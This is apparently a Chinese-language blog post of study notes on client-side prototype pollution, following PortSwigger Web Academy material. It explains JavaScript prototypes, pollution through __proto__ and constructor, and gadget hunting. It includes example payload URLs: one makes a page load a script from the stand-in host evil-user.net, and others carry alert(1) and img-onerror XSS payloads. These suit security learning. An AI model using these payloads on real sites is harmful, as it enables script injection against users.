---
title: Client-side prototype pollution
author: suo yuan
date: 2022-12-25T03:42:51Z
draft: false
tags:
  - Web Security
  - PortSwigger Web Academy
description: "PortSwigger Web Academy 中关于 Client-side prototype pollution 的部分"
---

<!--more-->
PortSwigger Web Academy 中关于 Client-side prototype pollution 的部分
<!--more-->

# Client-side prototype pollution

## 概述

prototype污染是一个JavaScript漏洞，该漏洞使得攻击者可以向全局prototype添加proerties，这些properties可能会被用户定义的对象继承。

通常prototype污染都是和其他漏洞一起利用打组合拳。

## JavaScript prototypes

和其他基于类的语言不同，JavaScript使用Prototypes继承模型。

### 对象

JavaScript的对象实际上就是被称为properties的键值对

```javascript
const user = {
  username: "wiener",
  userId: 01234,
  isAdmin: false,
};
```

访问一个对象的proerties可以通过如下两种方式

```javascript
user.username; // "wiener"
user["userId"]; // 01234
```

properties同样也可以是函数，被称为方法

```javascript
const user = {
  username: "wiener",
  userId: 01234,
  exampleMethod: function () {
    // do something
  },
};
```

### prototypes

任何一个JavaScript的对象被链接到另一种类型的对象，被称之为prototype。默认情况下，JavaScript自动为新对象分配其内置的全局prototype之一。例如string会被自动被分配内置的String.prototype。

```javascript
let myObject = {};
Object.getPrototypeOf(myObject); // Object.prototype

let myString = "";
Object.getPrototypeOf(myString); // String.prototype

let myArray = [];
Object.getPrototypeOf(myArray); // Array.prototype

let myNumber = 1;
Object.getPrototypeOf(myNumber); // Number.prototype
```

对象自动继承被分配的prototype的所有properties，除非该对象已经有了相关的定义。这允许开发者创建新的类重用已有的类的properties或方法。

内置全局prototypes提供了一些有用的properties和方法去处理基本的数据类型。例如`String.prototype`有`toLowerCase()`方法，这可以让字符串自然就存在一个随时可用的方法将他们转换成lowercase，这就节省了开发者的精力。

### 对象继承

当引用一个对象的property的时候，JavaScript引擎会先在对象本身去寻找，没找到再去对应的全局prototype寻找

### prototype链

每一个对象的prototype也是一个对象，这个对象同样也会有对应的prototype。JavaScript中几乎所有的东西都是一个对象，这个链的终点就是`Object.prototype`，它的prototype是null。

### \_\_proto\_\_

每个对象都有一个特殊的property去访问他的prototype。虽然这没有一个正式标准化的名字，但是大多数浏览器以`__proto__`作为行业标准。这个property提供了读写两种操作，不仅可以读取prototype和他的properties，并且还可以在必要的时候修改它。

同样有两种方法访问`__proto__`

```javascript
username.__proto__;
username["__proto__"];
```

也可以多来几个访问prototype的prototype

```javascript
username.__proto__; // String.prototype
username.__proto__.__proto__; // Object.prototype
username.__proto__.__proto__.__proto__; // null
```

### 修改prototype

只需要正常的修改即可，比如给`String.prototype`添加一个方法

```javascript
String.prototype.removeWhitespace = function () {
  // remove leading and trailing whitespace
};
let searchTerm = "  example ";
searchTerm.removeWhitespace(); // "example"
```

字符串都继承了这个prototype，所以都能调用这个方法。

## 漏洞产生

JavaScript函数递归地将包含可控properties的对象合并到现有对象中的时候，就有可能出现prototype污染漏洞。攻击者可以通过`__proto__`或者其他任意嵌套的properties去注入。

由于`__proto__`的含义，合并操作可以将properties分配给对象的prototype而不是它本身。

## 漏洞利用

- 污染源：可以去污染的全局prototype
- 一个支持任意代码执行的方法或者DOM元素
- gadget：
  - 它被不安全地使用
  - 继承了攻击者污染的prototype，被修改的properties不能在gadget上已有定义。一些网站会让对象的prototype为null以确保它没有继承任何东西。

### 污染源

污染源允许攻击者输入添加properties到全局prototype，常见污染源如下：

- URL
- JSON输入
- Web信息

#### 基于URL的prototype污染

```
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```

当将查询字符串分解成键值对时，`__proto__`可能被解释为任意字符串，合并到对象时不会合并到对象本身，而是分配给prototype，语句类似这样：

```javascript
targetObject.__proto__.evilProperty = "payload";
```

#### 基于JSON 输入的prototype污染

用户可控的对象通常使用`JSON.parse()`方法派生自JSON字符串。`JSON.parse()`方法将JSON对象的任何key视作字符串，包括`__proto__`这样的。
假设攻击者通过Web信息注入恶意的JSON：

```
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

再通过`JSON.parse()`方法将它转换为JavaScript对象，生成的对象就会具有`__proto__`这样的property。

```javascript
const objectLiteral = { __proto__: { evilProperty: "payload" } };
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty("__proto__"); // false
objectFromJson.hasOwnProperty("__proto__"); // true
```

如果这样的对象与现有对象合并，并且没有进行适当的过滤，就可以导致prototype污染。

### 例子

很多JavaScript库允许开发者给对象使用不用的配置选项。库代码检查开发人员是否显示地向对象添加属性，如果添加则会相应地调整配置。如果特定选项的property不存在就会使用预定义的默认选项。

```javascript
let transport_url = config.transport_url || defaults.transport_url;
```

假设库代码使用`transport_url`向页面添加一个脚本引用

```javascript
let script = document.createElement("script");
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

如果网站开发者为由为`config`对象设置`transport_url`property的话，这就是一个gadget。攻击者可以利用自己的`transport_url`污染全局`Object.prototype`，这将被`config`对象继承。脚本的`src`也被设置为攻击者指定的域名。

如果这个prototype可以被查询参数污染，受害者只需点击下方链接即可从攻击者指定的域中导入一个JS文件

```
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```

攻击者可以直接诶嵌入XSS的payload，例如

```
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```

上述URL后面的`//`时为了绕过`/example.js`后缀

## 发现漏洞

### 寻找污染点

#### 手工挖掘

手工挖掘就是试错，尝试采用不同的方法向`Object.prototype`添加任意的property。

1 .尝试去在一些地方注入任意的property，比如：

- vulnerable-website.com/?\_\_proto\_\_[foo]=bar

2 .在浏览器console检查`Object.prototype`以确认这个property是否成功污染了它
3 .如果property没有被添加到全局prototype中，尝试不同的方法，比如用`.`而不是`[]`：

- vulnerable-website.com/?\_\_proto\_\_.foo=bar

#### 使用 DOM Invader

用于代替手工挖掘

### 寻找gadget

#### 手工挖掘

1. 观察源代码并确认被使用的任何properties
2. 拦截包含要测试的JavaScript的响应数据包
3. 在脚本开头添加一个`debuger`，然后转发剩余的数据包
4. 打开脚本被载入的页面，添加的`debuger`会暂停脚本的执行
5. 此时在浏览器console输入以下命令：

```javascript
Object.defineProperty(Object.prototype, "YOUR-PROPERTY", {
  get() {
    console.trace();
    return "polluted";
  },
});
```

这个property被记录到全局`Object.prototype`。每次访问这个property的时候，浏览器都会将堆栈跟踪记录到console

1. 继续执行脚本并且监视console。只要堆栈真的被记录了就可以确定这个property被访问了
2. 展开堆栈跟踪并且使用它提供的链接跳转到正在读取property的代码所在的行
3. 使用浏览器调试，逐步执行以查看这个property是否被传递给sink，比如`innerHTML`或`eval()`

#### 使用DOM Invader

手工寻找gadget在目前网站通常依赖于大量第三方库的情况下是一个艰巨的任务。

## 通过constructor实现prototype污染

上面阐述的经典的prototype污染，一个常见的防御方法就是在合并用户可控对象之前去掉任何带有`__proto__`的property。事实上有其他方法在不依赖`__proto__`字符串的情况下引用`Object.prototype`

除非prototype为null，否则每个JS对象都有一个名为`constructor`的property，其中包含对创建它的构造函数的引用。下面两条语句就是调用`Object`构造函数：

```javascript
let myObjectLiteral = {};
let myObject = new Object();
```

也可以直接调用`construcotr`：

```javascript
myObjectLiteral.constructor; // function Object(){...}
myObject.constructor; // function Object(){...}
```

函数实际上也是对象。每个构造函数都有一个叫做`prototype`的porperty，它指向了被分配给由这个构造函数创建出的任何对象的prototype，所以也可以通过这个来访问对象的prototype

```javascript
myObject.constructor.prototype; // Object.prototype
myString.constructor.prototype; // String.prototype
myArray.constructor.prototype; // Array.prototype
```

由此可见，`myObject.constructor.prototype`等价于`myObject.__proto__`，攻击的时候就有一个可供替代的选项

## 通过浏览器API实现prototype污染

### fetch()

`fetch`API能够简单地发送HTTP请求，`fetch()`函数总共接收两个参数：

1. URL
2. 一个可以指定请求数据包一些参数的对象

下面这个例子展示了如何通过这个函数发送一个POST请求：

```javascript
fetch("https://normal-website.com/my-account/change-email", {
  method: "POST",
  body: "user=carlos&email=carlos%40ginandjuice.shop",
});
```

上述代码定义了`method`和`boby`两个properties，但还有一些prpperities没有定义。攻击者可以使用自己的`headers`property污染`Object.prototype`，然后被传递到`fetch()`函数的对象继承，随即发送请求。

```javascript
fetch("/my-products.json", { method: "GET" })
  .then(response => response.json())
  .then(data => {
    let username = data["x-username"];
    let message = document.querySelector(".message");
    if (username) {
      message.innerHTML = `My products. Logged in as <b>${username}</b>`;
    }
    let productList = document.querySelector("ul.products");
    for (let product of data) {
      let product = document.createElement("li");
      product.append(product.name);
      productList.append(product);
    }
  })
  .catch(console.error);
```

攻击者可以通过`x-username`headers污染`Object.prototype`：

```
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
```

### Object.defineProperty()

开发者可以使用`Object.defineProperty()`来使得对象有不可被修改的property：

```javascript
Object.defineProperty(vulnerableObject, "gadgetProperty", {
  configurable: false,
  writable: false,
});
```

上述代码看上去可以是一个合理的写法，实际上是有缺陷的。就像上边的`fetch()`函数一样，`Object.defineProperty()`也接收一个对象。开发者可以使用这个对象为正在定义的属性赋初值，不过如果只是为了防犯这个攻击，开发者可能不会设置一个初始值。

攻击者可以通过恶意`value`这个property污染`Object.prototype`绕过这个防御。如果它被传递给`Object.defineProtoperty()`的对象继承了，用户可控的值可能最终就被分配给gadget property。
